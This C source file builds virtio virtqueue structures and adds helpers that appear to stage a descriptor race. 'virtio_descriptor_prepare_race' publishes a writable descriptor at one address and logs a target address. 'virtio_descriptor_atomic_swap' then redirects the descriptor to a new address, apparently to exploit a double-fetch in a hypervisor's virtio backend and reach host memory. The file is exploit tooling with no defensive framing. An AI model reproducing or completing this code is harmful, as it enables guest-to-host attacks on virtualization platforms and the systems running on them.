#include "virtio.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

virtqueue_t* virtio_queue_create(uint16_t queue_size) {
    if (queue_size > VIRTIO_RING_SIZE || queue_size == 0) {
        return NULL;
    }

    virtqueue_t *vq = calloc(1, sizeof(virtqueue_t));
    if (!vq) return NULL;

    size_t desc_size = sizeof(vring_desc_t) * queue_size;
    vq->desc = aligned_alloc(4096, (desc_size + 4095) & ~4095);

    size_t avail_size = sizeof(vring_avail_t);
    vq->avail = aligned_alloc(4096, (avail_size + 4095) & ~4095);

    size_t used_size = sizeof(vring_used_t);
    vq->used = aligned_alloc(4096, (used_size + 4095) & ~4095);

    if (!vq->desc || !vq->avail || !vq->used) {
        free(vq->desc);
        free(vq->avail);
        free(vq->used);
        free(vq);
        return NULL;
    }

    memset(vq->desc, 0, desc_size);
    memset(vq->avail, 0, avail_size);
    memset(vq->used, 0, used_size);

    vq->num = queue_size;
    vq->free_head = 0;
    vq->last_used_idx = 0;

    for (uint16_t i = 0; i < queue_size - 1; i++) {
        vq->desc[i].next = i + 1;
        vq->desc[i].flags = VIRTIO_DESC_F_NEXT;
    }
    vq->desc[queue_size - 1].next = 0;
    vq->desc[queue_size - 1].flags = 0;

    return vq;
}

void virtio_queue_destroy(virtqueue_t *vq) {
    if (vq) {
        free(vq->desc);
        free(vq->avail);
        free(vq->used);
        free(vq);
    }
}

bool virtio_descriptor_prepare_race(virtqueue_t *vq, uint64_t initial_addr,
                                     uint64_t target_addr, uint16_t *desc_idx) {
    if (!vq || vq->free_head >= vq->num) {
        return false;
    }

    uint16_t idx = vq->free_head;

    vq->desc[idx].addr = initial_addr;
    vq->desc[idx].len = 4096;
    vq->desc[idx].flags = VIRTIO_DESC_F_WRITE;
    vq->desc[idx].next = 0;

    vq->free_head = vq->desc[idx].next;

    uint16_t avail_idx = vq->avail->idx;
    vq->avail->ring[avail_idx % vq->num] = idx;

    __sync_synchronize();

    vq->avail->idx = avail_idx + 1;

    *desc_idx = idx;

    printf("[*] Prepared race descriptor %u: 0x%lx -> 0x%lx\n",
           idx, initial_addr, target_addr);

    return true;
}

bool virtio_descriptor_atomic_swap(vring_desc_t *desc, uint64_t new_addr) {
    if (!desc) return false;

    __sync_synchronize();

    desc->addr = new_addr;

    __sync_synchronize();

    return true;
}
